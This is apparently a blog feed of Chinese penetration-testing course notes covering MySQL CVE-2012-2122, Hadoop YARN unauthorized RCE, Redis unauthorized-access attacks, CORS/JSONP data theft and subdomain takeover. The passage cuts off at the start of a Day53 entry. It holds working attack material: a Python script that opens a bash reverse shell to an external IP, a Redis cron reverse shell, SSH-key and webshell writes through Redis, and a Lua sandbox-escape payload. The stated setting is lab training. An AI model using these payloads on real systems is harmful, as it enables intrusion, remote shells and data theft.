      <link href="/2023/03/10/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/"/>
      <url>/2023/03/10/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/NGp7SONN1KZIu0bK_GC_Ww.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、服务攻防-数据库类型安全</p><p>2、Redis&amp;Hadoop&amp;Mysql安全</p><p>3、Mysql-CVE-2012-2122漏洞</p><p>4、Hadoop-配置不当未授权三重奏&amp;RCE漏洞</p><p>3、Redis-配置不当未授权三重奏&amp;RCE两漏洞</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见服务应用的安全测试：</p><p>1、配置不当-未授权访问</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>应用服务安全测试流程：见图</p><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="下列复现参过程链接：-https-blog-csdn-net-m0-63917373-article-details-128115706"><a href="#下列复现参过程链接：-https-blog-csdn-net-m0-63917373-article-details-128115706" class="headerlink" title="下列复现参过程链接：(https://blog.csdn.net/m0_63917373/article/details/128115706)"></a>下列复现参过程链接：(<a href="https://blog.csdn.net/m0_63917373/article/details/128115706">https://blog.csdn.net/m0_63917373/article/details/128115706</a>)</h4><p>➢ Mysql-未授权访问-CVE-2012-2122利用</p><p>➢ Hadoop-未授权访问-内置配合命令执行RCE</p><p>➢ Redis-未授权访问-Webshell&amp;任务&amp;密匙&amp;RCE等</p><h4 id="Mysql-未授权访问-CVE-2012-2122利用"><a href="#Mysql-未授权访问-CVE-2012-2122利用" class="headerlink" title="#Mysql-未授权访问-CVE-2012-2122利用"></a>#Mysql-未授权访问-CVE-2012-2122利用</h4><p>受影响版本：</p><ul><li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li><li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li></ul><p>msf漏洞检测：利用此漏洞需要知道mysql用户名</p><p>msf:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search CVE-2012-2122</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.154.3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>复现环境：vulhub 内置端口33067</p><p>linux下执行命令：（利用for循环去做验证）</p><p>for i in <code>seq 1 1000</code>; do mysql -uroot -pwrong -h <strong>your-ip</strong> -P3306 ; done</p><p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/image-20230310204235777.png" alt="image-20230310204235777"></p><p>mysql默认只能本地访问（除非存在phpmyadmin）：</p><p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/image-20230310205541082.png" alt="image-20230310205541082"></p><h4 id="Hadoop-未授权访问-内置配合命令执行RCE"><a href="#Hadoop-未授权访问-内置配合命令执行RCE" class="headerlink" title="#Hadoop-未授权访问-内置配合命令执行RCE"></a>#Hadoop-未授权访问-内置配合命令执行RCE</h4><p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/image-20230310205909725.png" alt="image-20230310205909725"></p><p>复现环境：vulfocuss</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">target = <span class="string">&#x27;http://123.58.236.76:31361/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;47.94.236.117&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">​    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">​    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">​        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">​            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">​        &#125;,</span><br><span class="line">​    &#125;,</span><br><span class="line">​    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure><h4 id="Redis-未授权访问-Webshell-amp-任务-amp-密匙-amp-RCE等"><a href="#Redis-未授权访问-Webshell-amp-任务-amp-密匙-amp-RCE等" class="headerlink" title="#Redis-未授权访问-Webshell&amp;任务&amp;密匙&amp;RCE等"></a>#Redis-未授权访问-Webshell&amp;任务&amp;密匙&amp;RCE等</h4><p>bind 127.0.0.1未开启，支持远程登录，未设置密码，未开启保护</p><h5 id="1、写Webshell-需得到Web路径"><a href="#1、写Webshell-需得到Web路径" class="headerlink" title="1、写Webshell 需得到Web路径"></a>1、写Webshell 需得到Web路径</h5><p>利用条件：Web目录权限可读写</p><p>config set dir &#x2F;tmp            #设置WEB写入目录</p><p>config set dbfilename 1.php    #设置写入文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set test <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>  <span class="comment">#设置写入文件代码</span></span><br></pre></td></tr></table></figure><p>bgsave                         #保存执行</p><p>save                           #保存执行</p><p>注意：部分没目录权限读写权限               </p><h5 id="2、写定时任务反弹shell"><a href="#2、写定时任务反弹shell" class="headerlink" title="2、写定时任务反弹shell"></a>2、写定时任务反弹shell</h5><p>利用条件：</p><p>允许异地登录</p><p>安全模式protected-mode处于关闭状态</p><p>config set dir &#x2F;var&#x2F;spool&#x2F;cron</p><p>set yy “\n\n\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5555 0&gt;&amp;1\n\n\n”</p><p>config set dbfilename x</p><p>save</p><p>注意：</p><p>centos会忽略乱码去执行格式正确的任务计划 </p><p>而ubuntu并不会忽略这些乱码，所以导致命令执行失败</p><h5 id="3、写入Linux-ssh-key公钥"><a href="#3、写入Linux-ssh-key公钥" class="headerlink" title="3、写入Linux ssh-key公钥"></a>3、写入Linux ssh-key公钥</h5><p>利用条件：</p><p>允许异地登录</p><p>Redis服务使用ROOT账号启动</p><p>安全模式protected-mode处于关闭状态</p><p>允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器</p><p>ssh-keygen -t rsa</p><p>cd &#x2F;root&#x2F;.ssh&#x2F;</p><p>(echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; key.txt</p><p>cat key.txt | redis-cli -h 118.31.57.214 -x set xxx</p><p>config set dir &#x2F;root&#x2F;.ssh&#x2F;</p><p>config set dbfilename authorized_keys</p><p>save</p><p>cd &#x2F;root&#x2F;.ssh&#x2F;</p><p>ssh -i id_rsa <a href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#x31;&#x31;&#x38;&#46;&#51;&#x31;&#46;&#x35;&#55;&#x2e;&#x32;&#49;&#52;">&#x72;&#x6f;&#111;&#116;&#x40;&#x31;&#x31;&#x38;&#46;&#51;&#x31;&#46;&#x35;&#55;&#x2e;&#x32;&#49;&#52;</a></p><h5 id="4、RCE自动化利用脚本-vulfocus"><a href="#4、RCE自动化利用脚本-vulfocus" class="headerlink" title="4、RCE自动化利用脚本-vulfocus"></a>4、RCE自动化利用脚本-vulfocus</h5><p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p><p>python redis-master.py -r 123.58.236.76 -p 11820 -L 47.94.236.117 -P 8888 -f RedisModulesSDK&#x2F;exp.so -c “id”</p><h5 id="5-新漏洞-沙箱绕过RCE-CVE-2022-0543-vulfocus"><a href="#5-新漏洞-沙箱绕过RCE-CVE-2022-0543-vulfocus" class="headerlink" title="5.新漏洞-沙箱绕过RCE CVE-2022-0543-vulfocus"></a>5.新漏洞-沙箱绕过RCE CVE-2022-0543-vulfocus</h5><p>Poc：执行id命令</p><p>eval ‘local io_l &#x3D; package.loadlib(“&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0”, “luaopen_io”); local io &#x3D; io_l(); local f &#x3D; io.popen(“id”, “r”); local res &#x3D; f:read(“*a”); f:close(); return res’ 0</p><p>靶场：Vulhub</p><p>服务器启动后，可以通过以下方法在没有凭据的情况下连接到此服务器：redis-cli -h ip -p port(对方的redis的ip和port)</p><p>本地kali开启docker环境</p><p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/image-20230311002333400.png" alt="image-20230311002333400"></p><p>攻击机：本地ubuntu</p><p>redis-cli -h 192.168.240.131 -p 6379</p><p><img src="/../images/Day55-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8-Redis-Hadoop-Mysql-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE/image-20230311002545905.png" alt="image-20230311002545905"></p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day54 WEB攻防-通用漏洞&amp;跨域CORS资源&amp;JSONP回调&amp;域名接管劫持</title>
      <link href="/2023/03/10/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/"/>
      <url>/2023/03/10/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、子域名接管-检测&amp;探针&amp;利用</p><p>2、COSP跨域资源-检测&amp;探针&amp;利用</p><p>3、JSONP跨域回调-检测&amp;探针&amp;利用</p><h3 id="前置知识点："><a href="#前置知识点：" class="headerlink" title="#前置知识点："></a>#前置知识点：</h3><h4 id="同源策略-SOP-“同源”包括三个条件：同协议-同域名-同端口"><a href="#同源策略-SOP-“同源”包括三个条件：同协议-同域名-同端口" class="headerlink" title="同源策略(SOP)-“同源”包括三个条件：同协议 同域名 同端口"></a>同源策略(SOP)-“同源”包括三个条件：同协议 同域名 同端口</h4><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310155832790.png" alt="image-20230310155832790"></p><p>同源策略限制从一个源加载的文档或脚本与来自另一个源的资源进行交互,这是一个用于隔离潜在恶意文件的关键的安全机制.简单说就是浏览器的一种安全策略。</p><p>虽然同源策略在安全方面起到了很好的防护作用,但也在一定程度上限制了一些前端功能的实现,所以就有了许多跨域的手段。</p><h4 id="子域名接管：（CNAME或者其下面指向域名过期或失效）"><a href="#子域名接管：（CNAME或者其下面指向域名过期或失效）" class="headerlink" title="子域名接管：（CNAME或者其下面指向域名过期或失效）"></a>子域名接管：（CNAME或者其下面指向域名过期或失效）</h4><p>域名解析记录指向域名，对应主机指向了一个当前未在使用或已经删除的特定服务，攻击者通过注册指向域名，从而控制当前域名的控制权，实现恶意软件分发、网络钓鱼&#x2F;鱼叉式网络钓鱼、XSS 、身份验证绕过等。子域名接管不仅仅限于CNAME记录，NS,MX甚至A记录也会受到影响。</p><p>检测项目：</p><p><a href="https://github.com/pwnesia/dnstake">https://github.com/pwnesia/dnstake</a></p><p><a href="https://github.com/anshumanbh/tko-subs">https://github.com/anshumanbh/tko-subs</a></p><p><a href="https://github.com/mhmdiaa/second-order">https://github.com/mhmdiaa/second-order</a></p><p><a href="https://github.com/r3curs1v3-pr0xy/sub404">https://github.com/r3curs1v3-pr0xy/sub404</a></p><p><a href="https://github.com/Echocipher/Subdomain-Takeover">https://github.com/Echocipher/Subdomain-Takeover</a></p><h4 id="COSP跨域资源（同源策略的配置不当）"><a href="#COSP跨域资源（同源策略的配置不当）" class="headerlink" title="COSP跨域资源（同源策略的配置不当）"></a>COSP跨域资源（同源策略的配置不当）</h4><p>CORS全称Cross-Origin Resource Sharing, 跨域资源共享，是HTML5的一个新特性，已被所有浏览器支持，跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制，以使不同的网站可以跨域获取数据。</p><p>Access-Control-Allow-Origin：指定哪些域可以访问域资源。例如，如果requester.com想要访问provider.com的资源，那么开发人员可以使用此标头安全地授予requester.com对provider.com资源的访问权限。</p><p>Access-Control-Allow-Credentials：指定浏览器是否将使用请求发送cookie。仅当allow-credentials标头设置为true时，才会发送Cookie。</p><p>Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法（GET，PUT，DELETE等）来访问资源。此标头允许开发人员通过在requester.com请求访问provider.com的资源时，指定哪些方法有效来进一步增强安全性。</p><p>检测项目：<a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></p><h4 id="JSONP跨域回调（在同源策略防护下引用资源回调导致）"><a href="#JSONP跨域回调（在同源策略防护下引用资源回调导致）" class="headerlink" title="JSONP跨域回调（在同源策略防护下引用资源回调导致）"></a>JSONP跨域回调（在同源策略防护下引用资源回调导致）</h4><p>JSONP跨域巧妙的利用了script标签能跨域的特点,实现了json的跨域传输。</p><p>检测项目：手工审查元素筛选或Burp项目</p><p><a href="https://github.com/p1g3/JSONP-Hunter">https://github.com/p1g3/JSONP-Hunter</a></p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ CORS资源跨域-敏感页面源码获取</p><p>➢ JSONP回调跨域-某牙个人信息泄露</p><p>➢ 子域名接管-瓜迪个人子域名劫持接管</p><p>➢ 检测项目-CORS&amp;JSONP&amp;子域名接管</p><h4 id="CORS资源跨域-敏感页面源码获取"><a href="#CORS资源跨域-敏感页面源码获取" class="headerlink" title="#CORS资源跨域-敏感页面源码获取"></a>#CORS资源跨域-敏感页面源码获取</h4><p>cors和csrf的区别</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310160537236.png" alt="image-20230310160537236"></p><p>CORS:设置问题</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310160823095.png" alt="image-20230310160823095"></p><p>复现步骤：</p><p>1、本地搭建访问页面跨域调用URL</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310161107118.png" alt="image-20230310161107118"></p><p>test.php,接收网页源码并生成secrect.html</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310161134410.png" alt="image-20230310161134410"></p><p>2、受害者访问当前页面被资源共享</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310161720469.png" alt="image-20230310161720469"></p><p>本地访问生成的secrect.html 获取到后台源码</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310161512190.png" alt="image-20230310161512190"></p><h4 id="JSONP回调跨域-某牙个人信息泄露"><a href="#JSONP回调跨域-某牙个人信息泄露" class="headerlink" title="#JSONP回调跨域-某牙个人信息泄露"></a>#JSONP回调跨域-某牙个人信息泄露</h4><p><strong>跟CSRF的区别是必须要有回调函数才可以利用</strong></p><p>同源策略可能指显示一部分不限制所有，因为总有需求要调用外部资源，如支付接口</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310162408810.png" alt="image-20230310162408810"></p><p>黑盒找：</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310162752490.png" alt="image-20230310162752490"></p><p>复现步骤：</p><p>1、登录某牙找到回调有敏感信息</p><p>本地搜索回调函数callback，找到有信息泄露的url地址</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310163137153.png" alt="image-20230310163137153"></p><p>2、本地搭建访问页面跨域调用URL</p><p>复制这个地址到本地的</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310163313676.png" alt="image-20230310163313676"></p><p>粘贴到本地的搭建的JSONP接触代码中</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310163450273.png" alt="image-20230310163450273"></p><p>3、对方访问页面可获取当前某牙信息</p><p>当有人访问这个test.html时，会将你在这个平台的个人信息页面的数据包获取到（包含个人的信息）</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310164937041.png" alt="image-20230310164937041"></p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310164641150.png" alt="image-20230310164641150"></p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310164429722.png" alt="image-20230310164429722"></p><h4 id="子域名接管-瓜迪个人子域名劫持接管"><a href="#子域名接管-瓜迪个人子域名劫持接管" class="headerlink" title="#子域名接管-瓜迪个人子域名劫持接管"></a>#子域名接管-瓜迪个人子域名劫持接管</h4><p>含义：<img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310165444813.png" alt="image-20230310165444813"></p><p>CNAME:</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310165549997.png" alt="image-20230310165549997"></p><p>复现步骤：</p><p>1、通过检测cname获取指向</p><p>发现test.xiaodi8.com是指向<a href="http://www.testxiaodi.fun的/">www.testxiaodi.fun的</a></p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310172443923.png" alt="image-20230310172443923"></p><p>2、发现testxiaodi.fun过期受控</p><p>3、注册testxiaodi.fun实现控制</p><p>假设注册了testxiaodi.fun，将其解析到你的网站ip，随后如果访问test.xiaodi8.com显示的页面跟我们自己的testxiaodi.fun一样，说明控制了test.xiaodi8.com，将其显示改为了跟testxiaodi.fun一样</p><h4 id="检测项目-CORS-amp-JSONP-amp-子域名接管"><a href="#检测项目-CORS-amp-JSONP-amp-子域名接管" class="headerlink" title="#检测项目-CORS&amp;JSONP&amp;子域名接管"></a>#检测项目-CORS&amp;JSONP&amp;子域名接管</h4><p>1、python cors_scan.py -i top_100_domains.txt -t 100(检测CORS)</p><p>2、人工排查+burpsuite 安装Jsonp_Hunter.py抓包使用(检测JSONP)</p><p>3、dnsub爬取子域名筛选接管(检测c)</p><p>如果这两个域名过期或者出现问题</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310171202916.png" alt="image-20230310171202916"></p><p>注册它并访问，就可以控制其主域</p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day53 WEB攻防-通用漏洞&amp;CRLF注入&amp;URL重定向&amp;资源处理拒绝服务</title>
      <link href="/2023/03/10/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/"/>
      <url>/2023/03/10/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、CRLF注入-原理&amp;检测&amp;利用</p><p>2、URL重定向-原理&amp;检测&amp;利用</p><p>3、Web拒绝服务-原理&amp;检测&amp;利用</p><h3 id="下节预告："><a href="#下节预告：" class="headerlink" title="#下节预告："></a>#下节预告：</h3><p>1、JSONP&amp;CORS跨域</p><p>2、域名安全-接管劫持</p><h3 id="详细点"><a href="#详细点" class="headerlink" title="#详细点"></a>#详细点</h3><h4 id="1-CRLF注入漏洞"><a href="#1-CRLF注入漏洞" class="headerlink" title="1.CRLF注入漏洞"></a>1.CRLF注入漏洞</h4><p>是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞。</p><p>如何检测安全问题：CRLFuzz</p><p>漏洞说明：改变数据包的传送数据如在后面添加如下payload，则可能在数据包里面出现host:<a href="http://www.xiaodi8.com,可能会覆盖原来的/">www.xiaodi8.com，可能会覆盖原来的</a></p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310142027153.png" alt="image-20230310142027153"></p><h4 id="2-URL重定向跳转"><a href="#2-URL重定向跳转" class="headerlink" 